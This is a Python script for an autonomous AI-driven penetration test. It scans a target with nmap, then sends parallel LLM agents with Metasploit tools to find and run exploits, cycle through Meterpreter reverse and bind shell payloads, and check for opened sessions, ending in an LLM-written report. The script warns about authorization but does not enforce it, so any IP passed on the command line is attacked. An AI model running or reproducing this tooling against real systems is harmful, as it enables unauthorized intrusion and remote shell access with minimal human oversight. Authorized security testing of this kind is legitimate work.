import asyncio
import json
import re
import socket
import subprocess
import sys
from langchain_ollama import ChatOllama
from langchain_openai import ChatOpenAI
from langchain_mcp_adapters.client import MultiServerMCPClient
from langchain_core.messages import HumanMessage, SystemMessage, ToolMessage


scanner_llm = ChatOllama(
    base_url="http://192.168.178.70:11434",
    model="qwen3.5:27b",
    temperature=0.1,
)

pentest_llm = ChatOpenAI(
    base_url="http://192.168.178.13:8003/v1",
    api_key="EMPTY",
    model="Qwen/Qwen3-235B-A22B-Instruct-2507-FP8",
    temperature=0.3,
)

report_llm = ChatOllama(
    base_url="http://192.168.178.70:11434",
    model="qwen3.5:27b",
    temperature=0.3,
)

TOOL_OUTPUT_LIMIT = 2000
MAX_HISTORY = 40
MAX_ITERATIONS = 100
MAX_CONCURRENT_MSF = 2
LPORT_BASE = 4444
LPORT_STEP = 6        # each agent gets 6 ports (3 payloads × 2 spare)

_msf_semaphore: asyncio.Semaphore | None = None


def get_local_ip(target: str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((target, 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


def run_nmap(ip: str) -> str:
    cmd = [
        "nmap", "-sV", "-Pn", "-n",
        "-T4", "--min-rate", "1000",
        "--version-intensity", "5",
        ip,
    ]
    print(f"[*] Running {' '.join(cmd)} ...")
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
    if result.returncode != 0:
        print(f"[!] nmap stderr: {result.stderr}", file=sys.stderr)
    return result.stdout


def discover_service_groups(services_text: str) -> list[dict]:
    """Ask the LLM to group discovered services into logical attack categories."""
    msgs = [
        SystemMessage(content=(
            "You are a penetration testing planner. Given a list of discovered services, "
            "group them into logical attack categories (e.g. 'FTP', 'Web', 'Remote Access', 'Database'). "
            "Return ONLY a valid JSON array — no explanation, no markdown. "
            "Each element must have: "
            "  'category': short name string, "
            "  'services': list of service strings from the input that belong to this group. "
            'Example: [{"category":"Web","services":["80/tcp http Apache 2.4.7","443/tcp https"]}, ...]'
        )),
        HumanMessage(content=f"Group these services into attack categories:\n\n{services_text}"),
    ]
    response = scanner_llm.invoke(msgs)
    raw = response.content.strip()

    # Extract JSON array from response (model may wrap it in markdown)
    match = re.search(r'\[.*\]', raw, re.DOTALL)
    if match:
        try:
            groups = json.loads(match.group())
            if isinstance(groups, list) and all("category" in g and "services" in g for g in groups):
                return groups
        except json.JSONDecodeError:
            pass

    # Fallback: single group with all services
    print("[!] Could not parse service groups from LLM — using single agent for all services.")
    return [{"category": "ALL", "services": [services_text]}]


def trim_messages(msgs: list) -> list:
    system = [m for m in msgs if isinstance(m, SystemMessage)]
    rest = [m for m in msgs if not isinstance(m, SystemMessage)]
    return system + rest[-MAX_HISTORY:]


def build_agent_prompt(
    category: str,
    services: list[str],
    target_ip: str,
    lhost: str,
    base_lport: int,
    all_services_text: str,
) -> tuple[str, str]:
    lports = [base_lport + i for i in range(3)]
    services_str = "\n".join(f"  - {s}" for s in services)

    payload_block = (
        f"LHOST for reverse shells: {lhost}  — always use this exact IP\n"
        f"YOUR LPORT RANGE (reserved for this agent): {lports[0]}, {lports[1]}, {lports[2]}\n\n"
        f"PAYLOAD SELECTION — before running any exploit:\n"
        f"  1. Call list_payloads(module_name=<exploit>) to get ALL compatible payloads for that module\n"
        f"  2. From the returned list, select payloads that match the target OS/arch\n"
        f"  3. Prioritise in this order:\n"
        f"       a. Meterpreter payloads (most capable)\n"
        f"       b. Shell payloads matching target arch (x64 > x86)\n"
        f"       c. cmd/ payloads as last resort\n"
        f"  4. Try reverse payloads first (LHOST={lhost}), then bind payloads if reverse fails\n"
        f"  5. For each payload try LPORTs: {lports[0]} → {lports[1]} → {lports[2]}\n"
        f"  6. payload_name is MANDATORY in run_exploit — never omit it\n"
        f"  7. Call list_active_sessions after every attempt\n"
        f"  8. Only abandon an exploit after trying at least 3 compatible payloads\n"
    )

    system_prompt = (
        f"You are a penetration testing assistant for an authorized assessment against {target_ip}.\n"
        f"Your focus: {category} services only. Other agents handle remaining services in parallel.\n\n"
        f"Your assigned services:\n{services_str}\n\n"
        f"Available Metasploit tools:\n"
        f"  - list_exploits(search_term): search exploits by service/product name\n"
        f"  - list_payloads(module_name): get ALL compatible payloads for a specific exploit module\n"
        f"  - run_auxiliary_module(module_name, options): run scanner or brute-force modules\n"
        f"  - run_exploit(module_name, options, payload_name, payload_options): run exploits — payload_name is MANDATORY\n"
        f"  - list_active_sessions(): check for active shells\n\n"
        f"CRITICAL: parameter is 'module_name', NOT 'module_path'\n"
        f"Example: run_auxiliary_module(module_name='scanner/ftp/ftp_version', "
        f"options={{'RHOSTS': '{target_ip}'}})\n\n"
        f"{payload_block}\n"
        f"Workflow:\n"
        f"  1. Run auxiliary version scanners to confirm exact service versions\n"
        f"  2. Search exploits for each confirmed service/product name\n"
        f"  3. Select only exploits matching the confirmed version — skip version mismatches\n"
        f"  4. Prioritize by rank: excellent/great first, good/normal only if those fail, skip average/low\n"
        f"  5. For each selected exploit: call list_payloads to discover compatible payloads\n"
        f"  6. Use check_vulnerability=True before running — skip if not vulnerable\n"
        f"  7. Run exploit with best payload, retry with alternatives on failure\n"
        f"  8. Check active sessions after every attempt\n"
        f"  9. Summarize findings when done\n"
    )

    human_msg = (
        f"Target {target_ip} — all discovered services for context:\n{all_services_text}\n\n"
        f"Your assigned category: {category}\n"
        f"Services to attack:\n{services_str}\n\n"
        f"Start by searching for exploits for each of your assigned services."
    )

    return system_prompt, human_msg


async def run_agent_loop(
    category: str,
    services: list[str],
    target_ip: str,
    lhost: str,
    base_lport: int,
    all_services_text: str,
) -> str:
    mcp_client = MultiServerMCPClient({
        "metasploit": {
            "command": "/home/user/metasploit-mcp.sh",
            "args": [],
            "transport": "stdio",
        }
    })
    msf_tools = await mcp_client.get_tools()
    tools_by_name = {t.name: t for t in msf_tools}
    pentest_llm_with_tools = pentest_llm.bind_tools(msf_tools, tool_choice="auto")

    system_prompt, human_msg = build_agent_prompt(
        category, services, target_ip, lhost, base_lport, all_services_text
    )
    msgs = [SystemMessage(content=system_prompt), HumanMessage(content=human_msg)]

    final_content = f"[{category}] No output produced."
    for iteration in range(MAX_ITERATIONS):
        print(f"\n[{category}] Iteration {iteration + 1}/{MAX_ITERATIONS}")
        msgs = trim_messages(msgs)
        response = await pentest_llm_with_tools.ainvoke(msgs)
        msgs.append(response)

        if response.content:
            print(f"[{category}] {response.content}")
            final_content = response.content

        if not response.tool_calls:
            if not response.content:
                print(f"[{category}] Empty response — stopping.")
            print(f"[{category}] Agent done.")
            break

        for tool_call in response.tool_calls:
            name = tool_call["name"]
            args = tool_call["args"]
            print(f"[{category}][TOOL] -> {name}({args})")

            if name not in tools_by_name:
                result_str = f"ERROR: unknown tool '{name}'"
            else:
                try:
                    async with _msf_semaphore:
                        result = await tools_by_name[name].ainvoke(tool_call)
                    result_str = str(result)
                except Exception as e:
                    result_str = f"ERROR: {e}"

            preview = result_str[:500] + ("..." if len(result_str) > 500 else "")
            print(f"[{category}][TOOL] <- {preview}")

            stored = result_str[:TOOL_OUTPUT_LIMIT] + (
                " [truncated]" if len(result_str) > TOOL_OUTPUT_LIMIT else ""
            )
            msgs.append(ToolMessage(content=stored, tool_call_id=tool_call["id"]))
    else:
        print(f"[{category}] Hit max iterations ({MAX_ITERATIONS}).")

    return final_content


async def main(target_ip: str):
    global _msf_semaphore
    _msf_semaphore = asyncio.Semaphore(MAX_CONCURRENT_MSF)

    print("=" * 60)
    print(f"AI-Assisted Security Assessment — Target: {target_ip}")
    print("=" * 60)
    print("\n[!] Only run this against systems you are authorized to test.\n")

    lhost = get_local_ip(target_ip)
    print(f"[*] Detected LHOST: {lhost}")

    # Stage 1: nmap scan + parse
    raw_scan = run_nmap(target_ip)
    parse_msgs = [
        SystemMessage(content=(
            "You are a security scanner assistant. Given raw nmap output, "
            "extract a clean structured list of open ports, the service "
            "running on each, and the detected version. Be concise."
        )),
        HumanMessage(content=f"Parse this nmap output:\n\n{raw_scan}"),
    ]
    parsed = scanner_llm.invoke(parse_msgs)
    services_text = parsed.content
    print("\n[+] Stage 1 — Parsed services:\n")
    print(services_text)

    # Discover attack groups from discovered services
    print("\n[*] Grouping services into attack categories...")
    groups = discover_service_groups(services_text)
    print(f"[*] Found {len(groups)} group(s):")
    for i, g in enumerate(groups):
        base_lport = LPORT_BASE + i * LPORT_STEP
        print(f"    [{g['category']}] ports {base_lport}-{base_lport + 2} — {g['services']}")

    print(f"\n[*] Spawning {len(groups)} parallel agent(s), "
          f"max {MAX_CONCURRENT_MSF} concurrent Metasploit operations\n")

    # Stage 2: parallel agent loops
    tasks = [
        run_agent_loop(
            g["category"],
            g["services"],
            target_ip,
            lhost,
            LPORT_BASE + i * LPORT_STEP,
            services_text,
        )
        for i, g in enumerate(groups)
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    combined_analysis = "\n\n".join(
        f"=== {g['category']} Agent ===\n{res}"
        if not isinstance(res, Exception)
        else f"=== {g['category']} Agent ===\nERROR: {res}"
        for g, res in zip(groups, results)
    )

    print("\n[+] Stage 2 — Pentest analysis (all agents):\n")
    print(combined_analysis)

    # Stage 3: final report
    report_msgs = [
        SystemMessage(content=(
            "You are a security report writer. Produce a short, professional "
            "command-line report (under 400 words). STRICT RULES:\n"
            "- Only report findings verbatim from the data below.\n"
            "- If no exploits were verified, say so explicitly.\n"
            "- Do not invent CVEs, dates, or severity ratings not present in the data.\n"
            "- Distinguish 'confirmed exploitable' from 'potentially vulnerable (not verified)'."
        )),
        HumanMessage(content=(
            f"Target: {target_ip}\n\n"
            f"Discovered services:\n{services_text}\n\n"
            f"Pentest analysis:\n{combined_analysis}\n\n"
            "Write the final report. Only include facts from the data above."
        )),
    ]
    report = report_llm.invoke(report_msgs)
    print("\n" + "=" * 60)
    print("FINAL REPORT")
    print("=" * 60)
    print(report.content)
    print("=" * 60)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python main3.py <target_ip>")
        sys.exit(1)
    asyncio.run(main(sys.argv[1]))
